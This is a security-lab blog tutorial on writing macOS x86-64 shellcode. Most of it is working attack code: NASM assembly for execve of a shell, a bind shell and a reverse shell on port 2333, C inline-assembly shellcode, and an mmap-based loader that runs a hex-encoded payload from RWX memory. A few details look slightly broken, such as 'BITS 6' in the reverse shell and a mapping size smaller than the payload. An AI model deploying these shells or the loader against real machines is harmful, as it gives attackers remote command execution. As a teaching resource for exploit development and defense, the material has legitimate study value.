> This article was first published on the [BreakOnCrash Lab](https://mp.weixin.qq.com/s/zjMdOTqO4IWhKVsMTyk_Og).

## Development Environment

- Device Info: `M1/macOS 12.6.3`
- Assembler Tool: `nasm`
- Linker Tool: `ld`
- Clang Version: `Apple clang version 13.1.6 (clang-1316.0.21.2.5)`
- Disassembler: `objdump`


## SystemCalls (AMD64)
To use system calls in assembly, you need to pass the system call number in the `rax` register. Parameters are passed through the following registers:

- `rdi`: First function argument
- `rsi`: Second function argument
- `rdx`: Third function argument (can also be the second return value)
- `rcx`: Fourth function argument
- `r8`: Fifth function argument
- `r9`: Sixth function argument
- `rax`: Contains the return value of the function

Other important registers include:

- `rip`: Instruction pointer
- `rsp`: Stack pointer (points to the top of the stack)
- `rbp`: Base pointer (points to the base of the stack)
- `rbx`: Base register (optional)

On macOS, system call numbers are divided into several "categories." The high bits of the system call number represent the category, as follows:

```
; none	0	 Invalid
; mach	1	 Mach
; unix	2	 Unix/BSD
; mdep 	3	 Machine-dependent
; diag	4	 Diagnostics
```

In the example, `write` and `exit` belong to the `Unix/BSD` category. Therefore, their high bits are set to 2. Every Unix system call is calculated as `0x2000000 + <Unix syscall number>` (the corresponding system call number can be looked up in [xnu-1504.3.12/bsd/kern/syscalls.master](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)):

```nasm
; helloworld.asm on macOS
; nasm -f macho64 helloworld.asm
; ld -macosx_version_min 10.14 -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib -lSystem -o helloworld helloworld.o

BITS    64
global  _main

section     .text
_main:
    ; write
    mov     rax, 0x2000004
    mov     rdi, 1
    mov     rsi, str
    mov     rdx, str.len
    syscall
    ; exit
    mov     rax, 0x2000001
    xor     rdi, rdi
    syscall

section     .data
    str:    db  "Hello World"
    .len:   equ $-str

```

This assembly code writes the string `str` to the standard output (STDOUT, file descriptor 1) using the `write` system call, and then terminates the program using the `exit` system call.

## Examples

### execve `/bin/zsh`

```nasm
; nasm -f macho64 execve.asm
; ld -macosx_version_min 10.14 -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib -lSystem -o execve execve.o 
; objdump -d bindshell

BITS    64
global  _main

section     .text
_main:
    ; execve("/bin/zsh", 0, 0)
    xor     rax, rax        ; Clear rax (rax = 0)
    mov     al, 0x2         ; rax = 0x2
    ror     rax, 0x28       ; Rotate rax 40 bits to the right (effectively left-shifting to rax = 0x2000000)
    mov     al, 0x3b        ; rax=execve

    xor     rdx, rdx        ; rdx=0
    xor     rsi, rsi        ; rsi = 0

    push    rdx
    mov     rdi, '/bin/zsh'
    push    rdx
    push    rdi
    push    rsp
    pop     rdi             ; rdi = '/bin/zsh'

    syscall                 ; rax=execve rdi='/bin/zsh' rsi=0 rdx=0
```

### Open Calculator.app

```nasm
; nasm -f macho64 exec_calc2.asm
; ld -macosx_version_min 10.14 -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib -lSystem -o exec_calc2 exec_calc2.o
; objdump -d bindshell

BITS        64
global      _main

section     .text
_main:
    xor     rax, rax
    mov     al, 0x2         ; rax=0x2
    ror     rax, 0x28       ; rax=0x2000000
    mov     al, 0x3b        ; rax=execve
    
    xor     rdx, rdx        ; rdx=0

    push    rdx
    mov     rdi, '/bin/zsh'
    push    rdx
    push    rdi
    push    rsp
    pop     rdi             ; rdi='/bin/zsh'

    mov     rbx, '-c'
    push    rdx
    push    rbx
    push    rsp
    pop     rbx             ; rbx='-c'

    ; open /System/Applications/Calculator.app
    ; open /Sy stem/App lication s/Calcul ator.app
    push    rdx
    mov     rcx, 'ator.app'
    push    rcx
    mov     rcx, 's/Calcul'
    push    rcx
    mov     rcx, 'lication'
    push    rcx
    mov     rcx, 'stem/App'
    push    rcx
    mov     rcx, 'open /Sy'
    push    rcx
    push    rsp
    pop     rcx

    push    rdx
    push    rcx
    push    rbx
    push    rdi
    push    rsp
    pop     rsi             ; rsi=['/bin/zsh', '-c', 'open /System/Applications/Calculator.app']
    
    syscall                 ; rax=execve rdi='/bin/zsh' rsi=['/bin/zsh', '-c', 'open /System/Applications/Calculator.app'] rdx=0
```

### Bind Shell

To begin, I will use clang to implement the shell-binding logic, as it clarifies my thought process:

```c
//  clang -arch x86_64  bindshell.c -o bindshell
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void)
{
    int srvfd;
    srvfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);

    struct sockaddr_in srv;
    srv.sin_family = AF_INET;
    srv.sin_port = 2333;
    srv.sin_addr.s_addr = INADDR_ANY;

    bind(srvfd, (struct sockaddr *)&srv, sizeof(srv));
    listen(srvfd, 0);

    int clifd;
    clifd = accept(srvfd, NULL, NULL);
    dup2(clifd, 0);
    dup2(clifd, 1);
    dup2(clifd, 2);

    execve("/bin/sh", NULL, NULL);
}
```

Then, implement it using NASM:

```nasm
; nasm -f macho64 bindshell.asm
; ld -macosx_version_min 10.14 -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib -lSystem -o bindshell bindshell.o 
; objdump -d bindshell

BITS        64
global      _main

section     .text
_main:
    ; socket
    xor     rax, rax
    mov     al, 0x2          ; rax=0x2
    ror     rax, 0x28        ; rax=0x2000000
    mov     al, 0x61         ; rax=socket
    mov     r8, rax   

    xor     rdx, rdx        ; rdx = IPPROTO_IP(0)
    mov     rsi, rdx
    inc     rsi             ; rsi = SOCK_STREAM(1)
    mov     rdi, rsi        ;
    inc     rdi             ; rdi = AF_INET(2)
    syscall                 ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP);

    mov     r12, rax        ; r12 = sfd

    ; sockaddr
    ; ip = 0.0.0.0 port = 2333 family = 2
    xor     r13, r13
    xor     r9, r9
    add     r13, 0x1D090101
    mov     r9b, 0xFF
    sub     r13, r9

    push    r13
    mov     r13, rsp
    
    ; bind
    add     r8, 0x7
    mov     rax, r8         ; rax = bind
    mov     rdi, r12        ; rdi = sfd
    mov     rsi, r13        ; rsi = sockaddr
    add     rdx, 0x10       ; rdx = len(sockaddr_in) = 16
    syscall

    ; listen
    add     r8, 0x2
    mov     rax, r8         ; rax = listen
    mov     rdi, r12        ; rdi = sfd
    xor     rsi, rsi        ; rsi = 0
    syscall

    ; accept
    sub     r8, 0x4C
    mov     rax, r8         ; rax = accept
    mov     rdi, r12        ; rdi = sfd
    xor     rsi, rsi
    xor     rdx, rdx
    syscall
    mov     r14, rax        ; r14 = cfd

    ; dup
    add     r8, 0x3C
    xor     rsi, rsi
    ; dup2(cfd, 0);
    ; dup2(cfd, 1);
    ; dup2(cfd, 2);
dup:
    mov     rax, r8                 ; rax = dup2
    mov     rdi, r14                ; rdi = cfd
    syscall                         ; dup2(cfd, rsi)
    
    cmp     rsi, 0x2                ; Is it less than 2? ----
    inc     rsi                     ; rsi ++       |
    jbe     dup                     ; Yes?jump to dup   <----

    ; exec
    sub     r8, 0x1F
    mov     rax, r8
    xor     rdx, rdx
    xor     rsi, rsi
    mov     r13, '//bin/sh'
    shr     r13, 8
    push    r13
    mov     rdi, rsp        ; rdi = '//bin/sh'
    syscall
```

![](https://github.com/user-attachments/assets/f3490032-9c80-4140-bba8-e01c64093200)


### Reverse Shell

Refer to `bindshell.asm` and replace the `bind`, `listen`, and `accept` system calls with `connect`:

```asm
; nasm -f macho64 reverse_shell.asm
; ld -macosx_version_min 10.14 -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib -lSystem -o reverse_shell reverse_shell.o 

BITS        6
global      _main

section     .text
_main:
    ; socket
    xor     rax, rax
    mov     al, 0x2          ; rax=0x2
    ror     rax, 0x28        ; rax=0x2000000
    mov     al, 0x61         ; rax=socket
    mov     r8, rax   

    xor     rdx, rdx        ; rdx = IPPROTO_IP(0)
    mov     rsi, rdx
    inc     rsi             ; rsi = SOCK_STREAM(1)
    mov     rdi, rsi        ;
    inc     rdi             ; rdi = AF_INET(2)
    syscall                 ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP);

    mov     r12, rax        ; r12 = sfd

    ; sockaddr
    ; ip = 0.0.0.0 port = 2333 family = 2
    xor     r13, r13
    xor     r9, r9
    add     r13, 0x1D090101
    mov     r9b, 0xFF
    sub     r13, r9

    push    r13
    mov     r13, rsp

    ; connect
    inc     r8
    mov     rax, r8         ; rax = connect
    mov     rdi, r12        ; rdi = sfd
    mov     rsi, r13        ; rsi = sockaddr
    add     rdx, 0x10       ; rdx = len(sockaddr_in) = 16
    syscall

    ; dup
    sub     r8, 0x8
    xor     rsi, rsi
    ; dup2(cfd, 0);
    ; dup2(cfd, 1);
    ; dup2(cfd, 2);
dup:
    mov     rax, r8                 ; rax = dup2
    mov     rdi, r12                ; rdi = cfd
    syscall                         ; dup2(cfd, rsi)
    
    cmp     rsi, 0x2                ; Is it less than 2? <----
    inc     rsi                     ; rsi ++       |
    jbe     dup                     ; Yes?jump to dup    <----

    ; exec
    sub     r8, 0x1F
    mov     rax, r8
    xor     rdx, rdx
    xor     rsi, rsi
    mov     r13, '//bin/sh'
    shr     r13, 8
    push    r13
    mov     rdi, rsp        ; rdi = '//bin/sh'
    syscall
```

![](https://github.com/user-attachments/assets/cc0dc796-352f-4a63-bca6-49b6d17bee39)


## Write Shellcode in C

```c
// clang -arch x86_64 -shared -fno-stack-protector -o execve.a execve.c
int main()
{
    char *args[3];
    char s[8];
    s[0] = '/';
    s[1] = 'b';
    s[2] = 'i';
    s[3] = 'n';
    s[4] = '/';
    s[5] = 's';
    s[6] = 'h';
    s[7] = 0;
    args[0] = s;
    args[1] = 0;
    args[2] = 0;
    long long int ret = 0;
    int y = 0x200003b;
    asm("movq  %4,%%rax;"
        "movq %1,%%rdi;"
        "mov %2,%%rsi;"
        "mov %3,%%rdx;"
        "syscall"
        : "=g"(ret)
        : "g"(args[0]), "g"(args[1]), "g"(args[2]), "g"(y));
    return ret;
}
```

Compilation Tips:

1. Use `clang`'s `-shared` compilation flag to generate position-independent code (in `gcc`, use `-fpie` and `-fpic`).
2. Use `clang`'s `-fno-stack-protector` compilation flag to eliminate stack-related calls.
3. Place the `/bin/sh` string on the stack.

## Shellcode loader

### SimpleLoader.c

```c
// Use mmap to allocate a memory region with `rwx` permissions, copy the `shellcode` into it, and then invoke `sc()` to set `eip` to the shellcode for execution.
// clang -arch x86_64  simple_loader.c -o simple_loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

// exec_calc shellcode
char shellcode[] = "\x48\x31\xc0\xb0\x02\x48\xc1\xc8\x28\xb0\x3b\x48\x31\xd2\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x52\x57\x54\x5f\xbb\x2d\x63\x00\x00\x52\x53\x54\x5b\x52\x48\xb9\x61\x74\x6f\x72\x2e\x61\x70\x70\x51\x48\xb9\x73\x2f\x43\x61\x6c\x63\x75\x6c\x51\x48\xb9\x6c\x69\x63\x61\x74\x69\x6f\x6e\x51\x48\xb9\x73\x74\x65\x6d\x2f\x41\x70\x70\x51\x48\xb9\x6f\x70\x65\x6e\x20\x2f\x53\x79\x51\x54\x59\x52\x51\x53\x57\x54\x5e\x0f\x05";

int main(int argc, char **argv)
{
    printf("Shellcode Length: %zd Bytes\n", strlen(shellcode));
    // start: The starting address of the user space to be mapped, typically NULL (specified by the kernel)
    // length: The size of the memory region to be mapped
    // prot: The desired memory protection flags
    // flags: Specifies the type of mapped object
    // fd: File descriptor (returned by the open function)
    // offset: The offset within the kernel space that has already been allocated for the memory region, e.g., a file's offset, typically a multiple of PAGE_SIZE
    // Return value: mmap() returns a pointer to the mapped region, which is the virtual address of the mapped kernel space in the user space
    void *ptr = mmap(0, 0x22, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);
    if (ptr == MAP_FAILED)
    {
        perror("mmap");
        exit(-1);
    }
    memcpy(ptr, shellcode, sizeof(shellcode));
    sc = ptr;
    sc();
    return 0;
}
```


## Reference

- [Mac OS X 64 bit Assembly System Calls](http://dustin.schultz.io/mac-os-x-64-bit-assembly-system-calls.html)
- [macOS syscalls table](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)
- [https://www.exploit-db.com/exploits/46397](https://www.exploit-db.com/exploits/46397)
- [https://shell-storm.org/shellcode/index.html](https://shell-storm.org/shellcode/index.html)
- [https://www.nasm.us/doc/nasmdoc0.html](https://www.nasm.us/doc/nasmdoc0.html)
- [https://nieyong.github.io/wiki_cpu/mmap详解.html](https://nieyong.github.io/wiki_cpu/mmap%E8%AF%A6%E8%A7%A3.html)
- [https://github.com/killswitch-GUI/C-OSX-Shellcode](https://github.com/killswitch-GUI/C-OSX-Shellcode)
- [https://archcloudlabs.com/projects/r2_shellcode_generation/](https://archcloudlabs.com/projects/r2_shellcode_generation/)

<!-- ##{"timestamp":1665301140}## -->